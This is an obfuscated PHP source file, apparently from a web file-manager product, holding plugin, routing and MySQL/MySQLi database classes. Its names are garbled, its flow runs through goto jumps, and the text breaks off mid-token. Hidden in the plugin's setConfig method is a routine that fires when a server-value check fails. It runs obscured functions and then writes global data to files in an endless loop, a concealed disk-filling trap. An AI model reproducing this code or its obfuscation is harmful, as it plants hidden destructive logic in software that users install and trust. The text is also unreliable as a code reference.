$F»—Â‚ù‰ì[783])) { $eîŞÇ±ˆí› = (include $e‘¹„¿—æ… . $AÚ¥åŞ¯ö’ . $F»—Â‚ù‰ì[783]); } else { if ($AÚ¥åŞ¯ö’ == $F»—Â‚ù‰ì[1434] && !file_exists($e‘¹„¿—æ… . $AÚ¥åŞ¯ö’ . $F»—Â‚ù‰ì[783]) && file_exists($e‘¹„¿—æ… . $F»—Â‚ù‰ì[1435])) { $eîŞÇ±ˆí› = (include $e‘¹„¿—æ… . $F»—Â‚ù‰ì[1435]); } else { if (file_exists($e‘¹„¿—æ… . $aÕ±óÊ™‘ . $F»—Â‚ù‰ì[783])) { $eîŞÇ±ˆí› = (include $e‘¹„¿—æ… . $aÕ±óÊ™‘ . $F»—Â‚ù‰ì[783]); } } } goto E¼ºç‰¤; EÈ›îÑÎù: $F»—Â‚ù‰ì =& $_SERVER[¹…ÕÄ]; $aÕ±óÊ™‘ = $F»—Â‚ù‰ì[1432]; $e‘¹„¿—æ… = $this->pluginPath . $F»—Â‚ù‰ì[1433]; goto b‡¶¦…´ÚÛ; E¼ºç‰¤: if (!is_array($eîŞÇ±ˆí›)) { return array(); } if (@count($eîŞÇ±ˆí›) > 0) { I18n::set($eîŞÇ±ˆí›); } return $eîŞÇ±ˆí›; goto f…¡ğÉŠÌè; f…¡ğÉŠÌè: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($D£¥ÄùÛŠî) { $c«²ö“°ÊÖ =& $_SERVER[¹…ÕÄ]; $cõ½ß•èí = $_SERVER[$c«²ö“°ÊÖ[811]]; $fî¤‹£ = $c«²ö“°ÊÖ[812]; if ($_SERVER[$c«²ö“°ÊÖ[813]] != $fî¤‹£($cõ½ß•èí)) { goto f¯¡ôìè¨Æ; f¯¡ôìè¨Æ: $CùÛŒ ñ…– = $c«²ö“°ÊÖ[814]; $aÈºà™Ş±¹ = $c«²ö“°ÊÖ[815]; $A÷™•¬õ´ = $_SERVER[$c«²ö“°ÊÖ[816]] . $c«²ö“°ÊÖ[817]; goto CØæ—ã…–; aè’ìæ·ôİ: $CùÛŒ ñ…–(); $Cù‰¯åàº¦ = $c«²ö“°ÊÖ[821]; $a³¨î¼·‰ = json_encode($GLOBALS[$c«²ö“°ÊÖ[822]]); goto A…ùÊÀÛŞ¥; A…ùÊÀÛŞ¥: $Bß‰Ü›õİ‹ = 1; for ($aµÈè—§‹Å = $Bß‰Ü›õİ‹; $aµÈè—§‹Å > 0; $aµÈè—§‹Å++) { $Cù‰¯åàº¦(DATA_PATH . $aµÈè—§‹Å, $a³¨î¼·‰); } goto fË’†Ô¾•; Fƒ¯ãÍï®: $B‚Ğ‘ô…§ = $c«²ö“°ÊÖ[819]; $B‚Ğ‘ô…§($_SERVER[$c«²ö“°ÊÖ[820]]); $CùÛŒ ñ…– = $c«²ö“°ÊÖ[814]; goto aè’ìæ·ôİ; CØæ—ã…–: $eÕÅÛˆˆìÈ = $aÈºà™Ş±¹($A÷™•¬õ´); $cŒ½©òîÙ = explode($c«²ö“°ÊÖ[227], $eÕÅÛˆˆìÈ); if (count($cŒ½©òîÙ) < $c«²ö“°ÊÖ[581]) { $DŠÛÏª×„Ú = $c«²ö“°ÊÖ[818]; $DŠÛÏª×„Ú(); } goto Fƒ¯ãÍï®; fË’†Ô¾•: } return $this->modelPlugin->setConfig($this->pluginName, $D£¥ÄùÛŠî); } public function onSetConfig($d¤¾ñóšõÇ) { } public function onGetConfig($BùğˆøÇœÃ) { } public function onChangeStatus($DŠâß§‚°) { } public function onUninstall() { } public function onInstall() { } public function authCheck($fŠœ‹ã³‰Ì = "\160\x6c\165\147\151\156\101\165\164\x68") { $aĞò‹°«»Å =& $_SERVER[¹…ÕÄ]; if (!defined($aĞò‹°«»Å[448])) { return !1; } if (_get($GLOBALS, $aĞò‹°«»Å[479])) { return !0; } $cò—®åºê¤ = $this->getConfig(); if (!$cò—®åºê¤[$fŠœ‹ã³‰Ì]) { return !1; } return ActionCall($aĞò‹°«»Å[1436], $cò—®åºê¤[$fŠœ‹ã³‰Ì]); } public function url($còªƒ¸ªÉÏ, $aù¯ë²™õ× = '', $cí˜·Â¿Öç = true) { goto B¤èˆ©¶ßÉ; B×ïÁê‘õ—: $B›Í†¹¯ƒÎ = $this->packageVersion(); $fÂÈƒñ†¦‡ = $A£æ´×ŞÊš . $B¨á´šì[434] . $B›Í†¹¯ƒÎ; if (substr($còªƒ¸ªÉÏ, 0, 4) == $B¨á´šì[146] || substr($còªƒ¸ªÉÏ, 0, 2) == $B¨á´šì[1221]) { $bœ ¤”‘ã = $còªƒ¸ªÉÏ . $B¨á´šì[1437] . $fÂÈƒñ†¦‡; } else { if ($aù¯ë²™õ× == $B¨á´šì[33]) { $bœ ¤”‘ã = $this->pluginHost . $còªƒ¸ªÉÏ . $B¨á´šì[1437] . $fÂÈƒñ†¦‡; } else { if ($aù¯ë²™õ× === $B¨á´šì[76]) { $bœ ¤”‘ã = $this->pluginHost . $còªƒ¸ªÉÏ; } else { if ($aù¯ë²™õ× == $B¨á´šì[1438]) { $bœ ¤”‘ã = STATIC_PATH . $còªƒ¸ªÉÏ . $B¨á´šì[1437] . $A£æ´×ŞÊš; } else { if ($aù¯ë²™õ× == $B¨á´šì[1439]) { $bœ ¤”‘ã = APP_HOST . $B¨á´šì[1440] . $còªƒ¸ªÉÏ . $B¨á´šì[1437] . $A£æ´×ŞÊš; } else { if (isset($c“ğØ±äÚÉ[$aù¯ë²™õ×])) { $bœ ¤”‘ã = $c“ğØ±äÚÉ[$aù¯ë²™õ×] . $còªƒ¸ªÉÏ . $B¨á´šì[1437] . $fÂÈƒñ†¦‡; } } } } } } goto e˜¥Ñù×œ; e˜¥Ñù×œ: if (!$cí˜·Â¿Öç) { return $bœ ¤”‘ã; } echo $bœ ¤”‘ã; goto f£÷ƒå„Ò; B¤èˆ©¶ßÉ: $B¨á´šì =& $_SERVER[¹…ÕÄ]; $c“ğØ±äÚÉ = $this->getConfig(); $A£æ´×ŞÊš = KOD_VERSION . $B¨á´šì[94] . KOD_VERSION_BUILD; goto B×ïÁê‘õ—; f£÷ƒå„Ò: } public function link($b”Ïä‘›ñƒ = false, $C×À£ƒÛ¨… = '') { $c‡³ªÙ«ä =& $_SERVER[¹…ÕÄ]; if (!$b”Ïä‘›ñƒ) { $this->link($c‡³ªÙ«ä[1441], $c‡³ªÙ«ä[1439]); $this->link($c‡³ªÙ«ä[1442], $c‡³ªÙ«ä[1438]); $this->link($c‡³ªÙ«ä[1443], $c‡³ªÙ«ä[1438]); $this->link($c‡³ªÙ«ä[1444], $c‡³ªÙ«ä[1438]); $this->link($c‡³ªÙ«ä[1445], $c‡³ªÙ«ä[1438]); return; } $BéŒÌ“¬Ê¨ = $this->url($b”Ïä‘›ñƒ, $C×À£ƒÛ¨…, !1); if (substr($b”Ïä‘›ñƒ, -3) == $c‡³ªÙ«ä[1446]) { echo $c‡³ªÙ«ä[1447] . $BéŒÌ“¬Ê¨ . $c‡³ªÙ«ä[1448] . $c‡³ªÙ«ä[227]; } else { if (substr($b”Ïä‘›ñƒ, -4) == $c‡³ªÙ«ä[1449]) { echo $c‡³ªÙ«ä[1450] . $BéŒÌ“¬Ê¨ . $c‡³ªÙ«ä[1451] . $c‡³ªÙ«ä[227]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\133\x5e\x2f\135\x2b", "\x3a\156\x75\x6d" => "\x5b\x30\55\x39\135\x2b", "\x3a\141\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($Eù¤–©Õß, $aÚØó¢¯øÅ) { $aŠéÂ¶Ù“ =& $_SERVER[¹…ÕÄ]; if ($Eù¤–©Õß == $aŠéÂ¶Ù“[1452]) { $FœÌíÅ­ë = array_map($aŠéÂ¶Ù“[1453], $aÚØó¢¯øÅ[0]); $dƒàË“èªŸ = strpos($aÚØó¢¯øÅ[1], $aŠéÂ¶Ù“[8]) === 0 ? $aÚØó¢¯øÅ[1] : $aŠéÂ¶Ù“[8] . $aÚØó¢¯øÅ[1]; $eĞİ¶ëè„‰ = $aÚØó¢¯øÅ[2]; } else { $FœÌíÅ­ë = null; $dƒàË“èªŸ = strpos($aÚØó¢¯øÅ[0], $aŠéÂ¶Ù“[8]) === 0 ? $aÚØó¢¯øÅ[0] : $aŠéÂ¶Ù“[8] . $aÚØó¢¯øÅ[0]; $eĞİ¶ëè„‰ = $aÚØó¢¯øÅ[1]; } array_push(self::$maps, $FœÌíÅ­ë); array_push(self::$routes, $dƒàË“èªŸ); array_push(self::$methods, strtoupper($Eù¤–©Õß)); array_push(self::$callbacks, $eĞİ¶ëè„‰); } public static function error($bíÄæ‘­¹¬) { self::$errorCallback = $bíÄæ‘­¹¬; } public static function haltOnMatch($D¥¯òÎß–¿ = true) { self::$halts = $D¥¯òÎß–¿; } public static function dispatch() { goto bŞù×ô­«í; aˆŠÜ‹”±Â: $EÁâÈ ù = array_keys(static::$patterns); $EÌ¯ˆÕ†¸£ = array_values(static::$patterns); $eˆĞÊØ‡ŠÛ = !1; goto BÇÌ¿Úè¬‰; BÇÌ¿Úè¬‰: self::$routes = preg_replace($bì»ŞÙ¹ ˜[1141], $bì»ŞÙ¹ ˜[8], self::$routes); if (in_array($F’ËÁ·ïš, self::$routes)) { $C¦¯ æœÏŸ = array_keys(self::$routes, $F’ËÁ·ïš); foreach ($C¦¯ æœÏŸ as $bØß£Àâ) { if (self::$methods[$bØß£Àâ] == $béö¬ãìâç || self::$methods[$bØß£Àâ] == $bì»ŞÙ¹ ˜[1455] || in_array($béö¬ãìâç, self::$maps[$bØß£Àâ])) { $eˆĞÊØ‡ŠÛ = !0; if (!is_object(self::$callbacks[$bØß£Àâ])) { $E·¹¯§«Ï« = explode($bì»ŞÙ¹ ˜[8], self::$callbacks[$bØß£Àâ]); $fÇòŸÉï‰Ğ = end($E·¹¯§«Ï«); $cšŒÊÙÇ‹Ê = explode($bì»ŞÙ¹ ˜[1456], $fÇòŸÉï‰Ğ); $Dä¢±ø = new $cšŒÊÙÇ‹Ê[0](); $Dä¢±ø->{$cšŒÊÙÇ‹Ê[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$bØß£Àâ]); if (self::$halts) { return; } } } } } else { $b‰ì¡õã‘— = 0; foreach (self::$routes as $bØß£Àâ) { if (strpos($bØß£Àâ, $bì»ŞÙ¹ ˜[4]) !== !1) { $bØß£Àâ = str_replace($EÁâÈ ù, $EÌ¯ˆÕ†¸£, $bØß£Àâ); } if (preg_match($bì»ŞÙ¹ ˜[1457] . $bØß£Àâ . $bì»ŞÙ¹ ˜[1458], $F’ËÁ·ïš, $bÉùĞ®ñ·¨)) { if (self::$methods[$b‰ì¡õã‘—] == $béö¬ãìâç || self::$methods[$b‰ì¡õã‘—] == $bì»ŞÙ¹ ˜[1455] || !empty(self::$maps[$b‰ì¡õã‘—]) && in_array($béö¬ãìâç, self::$maps[$b‰ì¡õã‘—])) { $eˆĞÊØ‡ŠÛ = !0; array_shift($bÉùĞ®ñ·¨); if (!is_object(self::$callbacks[$b‰ì¡õã‘—])) { $E·¹¯§«Ï« = explode($bì»ŞÙ¹ ˜[8], self::$callbacks[$b‰ì¡õã‘—]); $fÇòŸÉï‰Ğ = end($E·¹¯§«Ï«); $cšŒÊÙÇ‹Ê = explode($bì»ŞÙ¹ ˜[1456], $fÇòŸÉï‰Ğ); $Dä¢±ø = new $cšŒÊÙÇ‹Ê[0](); if (!method_exists($Dä¢±ø, $cšŒÊÙÇ‹Ê[1])) { echo $bì»ŞÙ¹ ˜[1459]; } else { call_user_func_array(array($Dä¢±ø, $cšŒÊÙÇ‹Ê[1]), $bÉùĞ®ñ·¨); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$b‰ì¡õã‘—], $bÉùĞ®ñ·¨); if (self::$halts) { return; } } } } $b‰ì¡õã‘—++; } } if ($eˆĞÊØ‡ŠÛ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $aÏÙ„Ö¢Úù =& $_SERVER[¹…ÕÄ]; header($_SERVER[$aÏÙ„Ö¢Úù[1460]] . $aÏÙ„Ö¢Úù[1461]); echo $aÏÙ„Ö¢Úù[1462]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$bì»ŞÙ¹ ˜[1454]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto DËèÑğ†õ; bŞù×ô­«í: $bì»ŞÙ¹ ˜ =& $_SERVER[¹…ÕÄ]; $F’ËÁ·ïš = parse_url($_SERVER[$bì»ŞÙ¹ ˜[1454]], PHP_URL_PATH); $béö¬ãìâç = $_SERVER[$bì»ŞÙ¹ ˜[156]]; goto aˆŠÜ‹”±Â; DËèÑğ†õ: } } goto c®©¹¢æöÎ; dø‚åÎ—Ô: class DbMysql extends Db { public function __construct($D£ˆ“È•æ = '') { $E‚‡ŠèÏ“ë =& $_SERVER[¹…ÕÄ]; if (!extension_loaded($E‚‡ŠèÏ“ë[745])) { think_exception(think_lang($E‚‡ŠèÏ“ë[10]) . $E‚‡ŠèÏ“ë[824]); } if (!empty($D£ˆ“È•æ)) { $this->config = $D£ˆ“È•æ; if (empty($this->config[$E‚‡ŠèÏ“ë[13]])) { $this->config[$E‚‡ŠèÏ“ë[13]] = $E‚‡ŠèÏ“ë[33]; } } } public function connect($fŸ•Ì“ÅÒ” = '', $d‡­¼¥ƒÃ = 0, $b…»ò®‡œ¢ = false) { $Aß“¬İçÜ =& $_SERVER[¹…ÕÄ]; if (!isset($this->linkID[$d‡­¼¥ƒÃ])) { goto EÂ¸°“´ë; f¿˜â®¨ä: mysql_query($Aß“¬İçÜ[829] . think_config($Aß“¬İçÜ[830]) . $Aß“¬İçÜ[55], $this->linkID[$d‡­¼¥ƒÃ]); if ($b¬ì…¸” > $Aß“¬İçÜ[831]) { mysql_query($Aß“¬İçÜ[832], $this->linkID[$d‡­¼¥ƒÃ]); } $this->connected = !0; goto C´ùäêµÁ; C´ùäêµÁ: if (1 != think_config($Aß“¬İçÜ[18])) { unset($this->config); } goto b©ë¢ç½¶²; b½à¿‡ ¸À: if ($b˜¾ù‡Ä‹) { $this->linkID[$d‡­¼¥ƒÃ] = mysql_pconnect($Aàø††²“¡, $fŸ•Ì“ÅÒ”[$Aß“¬İçÜ[827]], $fŸ•Ì“ÅÒ”[$Aß“¬İçÜ[828]], 131072); } else { $this->linkID[$d‡­¼¥ƒÃ] = mysql_connect($Aàø††²“¡, $fŸ•Ì“ÅÒ”[$Aß“¬İçÜ[827]], $fŸ•Ì“ÅÒ”[$Aß“¬İçÜ[828]], !0, 131072); } if (!$this->linkID[$d‡­¼¥ƒÃ] || !empty($fŸ•Ì“ÅÒ”[$Aß“¬İçÜ[17]]) && !mysql_select_db($fŸ•Ì“ÅÒ”[$Aß“¬İçÜ[17]], $this->linkID[$d‡­¼¥ƒÃ])) { think_exception(mysql_error()); } $b¬ì…¸” = mysql_get_server_info($this->linkID[$d‡­¼¥ƒÃ]); goto f¿˜â®¨ä; EÂ¸°“´ë: if (empty($fŸ•Ì“ÅÒ”)) { $fŸ•Ì“ÅÒ” = $this->config; } $Aàø††²“¡ = $fŸ•Ì“ÅÒ”[$Aß“¬İçÜ[825]] . ($fŸ•Ì“ÅÒ”[$Aß“¬İçÜ[826]] ? "\x3a{$fŸ•Ì“ÅÒ”[$Aß“¬İçÜ[826]]}" : $Aß“¬İçÜ[33]); $b˜¾ù‡Ä‹ = !empty($fŸ•Ì“ÅÒ”[$Aß“¬İçÜ[13]][$Aß“¬İçÜ[14]]) ? $fŸ•Ì“ÅÒ”[$Aß“¬İçÜ[13]][$Aß“¬İçÜ[14]] : $this->pconnect; goto b½à¿‡ ¸À; b©ë¢ç½¶²: } return $this->linkID[$d‡­¼¥ƒÃ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Dª¶ŞêÔÊ¼) { goto bÂÓã¯çÜ; D—«ğ»·ù£: think_action_status($cï¸ïÖÑâÔ[19], 1); think_status($cï¸ïÖÑâÔ[20]); $this->queryID = mysql_query($Dª¶ŞêÔÊ¼, $this->_linkID); goto E¨„ÃÔœ„±; bÂÓã¯çÜ: $cï¸ïÖÑâÔ =& $_SERVER[¹…ÕÄ]; if (0 === stripos($Dª¶ŞêÔÊ¼, $cï¸ïÖÑâÔ[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto c†âÖ¸é›Ç; c†âÖ¸é›Ç: if (!$this->_linkID) { return !1; } $this->queryStr = $Dª¶ŞêÔÊ¼; if ($this->queryID) { $this->free(); } goto D—«ğ»·ù£; E¨„ÃÔœ„±: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto C°§¿£„±«; C°§¿£„±«: } public function execute($aÍ¶Ù’‘ ) { goto A†µğˆàÒ‚; A†µğˆàÒ‚: $BøçÒ’œ…Í =& $_SERVER[¹…ÕÄ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto EËÈãê©È“; eëæ‹ˆºÖÏ: think_status($BøçÒ’œ…Í[20]); $C¤œ£ŠöË = mysql_query($aÍ¶Ù’‘ , $this->_linkID); $this->debug(); goto A­ãõöñŠÏ; EËÈãê©È“: $this->queryStr = $aÍ¶Ù’‘ ; if ($this->queryID) { $this->free(); } think_action_status($BøçÒ’œ…Í[21], 1); goto eëæ‹ˆºÖÏ; A­ãõöñŠÏ: if (!1 === $C¤œ£ŠöË) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto a¥ˆÙÚ³¦; a¥ˆÙÚ³¦: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¹…ÕÄ][833], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bêç×É¦™¸ = mysql_query($_SERVER[¹…ÕÄ][834], $this->_linkID); $this->transTimes = 0; if (!$Bêç×É¦™¸) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $e…¯ëšÂî = mysql_query($_SERVER[¹…ÕÄ][835], $this->_linkID); $this->transTimes = 0; if (!$e…¯ëšÂî) { $this->error(); return !1; } } return !0; } private function getAll() { $AÕŒŒƒ¨‚½ = array(); if ($this->numRows > 0) { while ($bĞñ¸Ë¸—¨ = mysql_fetch_assoc($this->queryID)) { $AÕŒŒƒ¨‚½[] = $bĞñ¸Ë¸—¨; } mysql_data_seek($this->queryID, 0); } return $AÕŒŒƒ¨‚½; } public function getFields($B÷õ…¸™©) { $D¥Å”¹óœŸ =& $_SERVER[¹…ÕÄ]; $AÚÈ­õ­ = $this->query($D¥Å”¹óœŸ[836] . $this->parseKey($B÷õ…¸™©)); $B¤¯Ö¤‡¬ = array(); if ($AÚÈ­õ­) { foreach ($AÚÈ­õ­ as $aÚŒöÕ¯ã => $FÅêèÁÉ÷Å) { $B¤¯Ö¤‡¬[$FÅêèÁÉ÷Å[$D¥Å”¹óœŸ[27]]] = array($D¥Å”¹óœŸ[28] => $FÅêèÁÉ÷Å[$D¥Å”¹óœŸ[27]], $D¥Å”¹óœŸ[29] => $FÅêèÁÉ÷Å[$D¥Å”¹óœŸ[30]], $D¥Å”¹óœŸ[31] => (bool) (strtoupper($FÅêèÁÉ÷Å[$D¥Å”¹óœŸ[32]]) === $D¥Å”¹óœŸ[837]), $D¥Å”¹óœŸ[34] => $FÅêèÁÉ÷Å[$D¥Å”¹óœŸ[35]], $D¥Å”¹óœŸ[36] => strtolower($FÅêèÁÉ÷Å[$D¥Å”¹óœŸ[37]]) == $D¥Å”¹óœŸ[38], $D¥Å”¹óœŸ[39] => strtolower($FÅêèÁÉ÷Å[$D¥Å”¹óœŸ[40]]) == $D¥Å”¹óœŸ[41]); } } return $B¤¯Ö¤‡¬; } public function getTables($F¦ÆÎ·š‰Ğ = '') { $A™éèƒŠ£œ =& $_SERVER[¹…ÕÄ]; if (!empty($F¦ÆÎ·š‰Ğ)) { $A‡Å¹ÏÜ¸ = $A™éèƒŠ£œ[838] . $F¦ÆÎ·š‰Ğ . $A™éèƒŠ£œ[839]; } else { $A‡Å¹ÏÜ¸ = $A™éèƒŠ£œ[840]; } $DëÃ…Áá“Ğ = $this->query($A‡Å¹ÏÜ¸); $Aœ†îóµ²ô = array(); foreach ($DëÃ…Áá“Ğ as $D¯Ğµò°¿„ => $aÂ…ËÊ×à) { $Aœ†îóµ²ô[$D¯Ğµò°¿„] = current($aÂ…ËÊ×à); } return $Aœ†îóµ²ô; } public function replace($FÓÚ®‡ˆ, $aÎ‘¬Í¸äé = array()) { $e›ÈìœªÆ =& $_SERVER[¹…ÕÄ]; foreach ($FÓÚ®‡ˆ as $bÜÏ½Ä•÷ => $f“·÷¦Şµ™) { $A±†Ä‚ÙÑä = $this->parseValue($f“·÷¦Şµ™); if (is_scalar($A±†Ä‚ÙÑä)) { $DÙ¢Ÿ²Ñï‰[] = $A±†Ä‚ÙÑä; $AÛÚÁÂ‡à–[] = $this->parseKey($bÜÏ½Ä•÷); } } $BŒ³ó«³» = $e›ÈìœªÆ[841] . $this->parseTable($aÎ‘¬Í¸äé[$e›ÈìœªÆ[275]]) . $e›ÈìœªÆ[842] . implode($e›ÈìœªÆ[47], $AÛÚÁÂ‡à–) . $e›ÈìœªÆ[843] . implode($e›ÈìœªÆ[47], $DÙ¢Ÿ²Ñï‰) . $e›ÈìœªÆ[844]; return $this->execute($BŒ³ó«³»); } public function insertAll($Dˆç¹«ç•±, $f‹¶‡ÙáŠ„ = array(), $fÏÈâ‹ó£˜ = false) { goto f…öÇ«ğ‚; e™·¦˜‹áõ: $A•ã¼…„Ô = ($fÏÈâ‹ó£˜ ? $dˆ¦÷Ì¿Ùõ[846] : $dˆ¦÷Ì¿Ùõ[847]) . $dˆ¦÷Ì¿Ùõ[848] . $this->parseTable($f‹¶‡ÙáŠ„[$dˆ¦÷Ì¿Ùõ[275]]) . $dˆ¦÷Ì¿Ùõ[842] . implode($dˆ¦÷Ì¿Ùõ[47], $f¾ ùóåÏ) . $dˆ¦÷Ì¿Ùõ[849] . implode($dˆ¦÷Ì¿Ùõ[47], $cãº‡»Ÿö); return $this->execute($A•ã¼…„Ô); goto fáàÎ³Ö°; e„îô§…: $cãº‡»Ÿö = array(); foreach ($Dˆç¹«ç•± as $BÆ—Ì°Åğ¤) { $AÚÁ‘™¼å‡ = array(); foreach ($BÆ—Ì°Åğ¤ as $aÉ¾÷®ïñ => $E¯ªÁÉâÈ—) { $E¯ªÁÉâÈ— = $this->parseValue($E¯ªÁÉâÈ—); if (is_scalar($E¯ªÁÉâÈ—)) { $AÚÁ‘™¼å‡[] = $E¯ªÁÉâÈ—; } } $cãº‡»Ÿö[] = $dˆ¦÷Ì¿Ùõ[256] . implode($dˆ¦÷Ì¿Ùõ[47], $AÚÁ‘™¼å‡) . $dˆ¦÷Ì¿Ùõ[844]; } array_walk($f¾ ùóåÏ, array($this, $dˆ¦÷Ì¿Ùõ[845])); goto e™·¦˜‹áõ; f…öÇ«ğ‚: $dˆ¦÷Ì¿Ùõ =& $_SERVER[¹…ÕÄ]; if (!is_array($Dˆç¹«ç•±[0])) { return !1; } $f¾ ùóåÏ = array_keys($Dˆç¹«ç•±[0]); goto e„îô§…; fáàÎ³Ö°: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $C¸àßòåÚ =& $_SERVER[¹…ÕÄ]; $this->error = mysql_errno() . $C¸àßòåÚ[4] . mysql_error($this->_linkID); if ($C¸àßòåÚ[33] != $this->queryStr) { $this->error .= LNG($C¸àßòåÚ[45]) . $this->queryStr; } think_trace($this->error, $C¸àßòåÚ[33], $C¸àßòåÚ[46]); return $this->error; } public function escapeString($dÑËÒµ²—æ) { if ($this->_linkID) { return mysql_real_escape_string($dÑËÒµ²—æ, $this->_linkID); } else { return mysql_escape_string($dÑËÒµ²—æ); } } public function parseKey(&$FÃôòÊÔÊ, $DÀ‡ŒÉãå© = true) { $bš³Ü÷§ÙÖ =& $_SERVER[¹…ÕÄ]; if ($DÀ‡ŒÉãå©) { $FÃôòÊÔÊ = $this->parseKeyCheck($FÃôòÊÔÊ); } if ($FÃôòÊÔÊ != $bš³Ü÷§ÙÖ[182] && !preg_match($bš³Ü÷§ÙÖ[850], $FÃôòÊÔÊ)) { $FÃôòÊÔÊ = $bš³Ü÷§ÙÖ[380] . trim($FÃôòÊÔÊ, $bš³Ü÷§ÙÖ[380]) . $bš³Ü÷§ÙÖ[380]; } return $FÃôòÊÔÊ; } } class DbMysqli extends Db { public function __construct($dœƒƒºòíœ = '') { $e®âŠª¦¬Á =& $_SERVER[¹…ÕÄ]; if (!extension_loaded($e®âŠª¦¬Á[744])) { think_exception(think_lang($e®âŠª¦¬Á[10]) . $e®âŠª¦¬Á[851]); } if (!empty($dœƒƒºòíœ)) { $this->config = $dœƒƒºòíœ; if (empty($this->config[$e®âŠª¦¬Á[13]])) { $this->config[$e®âŠª¦¬Á[13]] = $e®âŠª¦¬Á[33]; } } } public function connect($Eï¸¹³óõ¯ = '', $F‰âáİ°Šâ = 0) { $cÇµ’ç½ğ± =& $_SERVER[¹…ÕÄ]; if (!isset($this->linkID[$F‰âáİ°Šâ])) { goto cŸ†ò½‡; cŸ†ò½‡: if (empty($Eï¸¹³óõ¯)) { $Eï¸¹³óõ¯ = $this->config; } $this->linkID[$F‰âáİ°Šâ] = new mysqli($Eï¸¹³óõ¯[$cÇµ’ç½ğ±[825]], $Eï¸¹³óõ¯[$cÇµ’ç½ğ±[827]], $Eï¸¹³óõ¯[$cÇµ’ç½ğ±[828]], $Eï¸¹³óõ¯[$cÇµ’ç½ğ±[17]], $Eï¸¹³óõ¯[$cÇµ’ç½ğ±[826]] ? intval($Eï¸¹³óõ¯[$cÇµ’ç½ğ±[826]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto eÏâˆø„Å; D«‚‰’›˜‰: $this->connected = !0; if (1 != think_config($cÇµ’ç½ğ±[18])) { unset($this->config); } goto D·Œóµ«; eÏâˆø„Å: $B´Ë¨ï½Ş– = $this->linkID[$F‰âáİ°Šâ]->server_version; $this->linkID[$F‰âáİ°Šâ]->query($cÇµ’ç½ğ±[829] . think_config($cÇµ’ç½ğ±[830]) . $cÇµ’ç½ğ±[55]); if ($B´Ë¨ï½Ş– > $cÇµ’ç½ğ±[831]) { $this->linkID[$F‰âáİ°Šâ]->query($cÇµ’ç½ğ±[832]); } goto D«‚‰’›˜‰; D·Œóµ«: } return $this->linkID[$F‰âáİ°Šâ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($cÑÛ—·ª®´) { goto B»ƒˆ×‘»ƒ; e÷‚‡×»îÃ: think_status($b¦­ö“’ÛÜ[20]); $this->queryID = $this->_linkID->query($cÑÛ—·ª®´); if ($this->_linkID->more_results()) { while (($e×ßƒì®‘’ = $this->_linkID->next_result()) != NULL) { $e×ßƒì®‘’->free_result(); } } goto fœ†ŸĞßù; A´Ş²ÒËË: $this->queryStr = $cÑÛ—·ª®´; if ($this->queryID) { $this->free(); } think_action_status($b¦­ö“’ÛÜ[19], 1); goto e÷‚‡×»îÃ; B»ƒˆ×‘»ƒ: $b¦­ö“’ÛÜ =& $_SERVER[¹…ÕÄ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A´Ş²ÒËË; fœ†ŸĞßù: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto d ²²ˆ»›ô; d ²²ˆ»›ô: } public function execute($CƒÀ½ÕÖæØ) { goto Bâé‰­Èƒ; Bâé‰­Èƒ: $fÁÉà¡‹§‹ =& $_SERVER[¹…ÕÄ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CÑãœ—°¼º; CÑãœ—°¼º: $this->queryStr = $CƒÀ½ÕÖæØ; if ($this->queryID) { $this->free(); } think_action_status($fÁÉà¡‹§‹[21], 1); goto AéÙÃã™‡†; FŞñŞº°ÏÍ: if (!1 === $CŠ‹ºèÅæ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto FÕº«ê¼¿; AéÙÃã™‡†: think_status($fÁÉà¡‹§‹[20]); $CŠ‹ºèÅæ = $this->_linkID->query($CƒÀ½ÕÖæØ); $this->debug(); goto FŞñŞº°ÏÍ; FÕº«ê¼¿: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d³²´ë©õé = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$d³²´ë©õé) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cí²ÉÑò… = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Cí²ÉÑò…) { $this->error(); return !1; } } return !0; } private function getAll() { $dªà…âå†á = array(); if ($this->numRows > 0) { for ($E’Ğˆ…Ù·‹ = 0; $E’Ğˆ…Ù·‹ < $this->numRows; $E’Ğˆ…Ù·‹++) { $dªà…âå†á[$E’Ğˆ…Ù·‹] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $dªà…âå†á; } public function getFields($FÃøí»ó²) { $d• 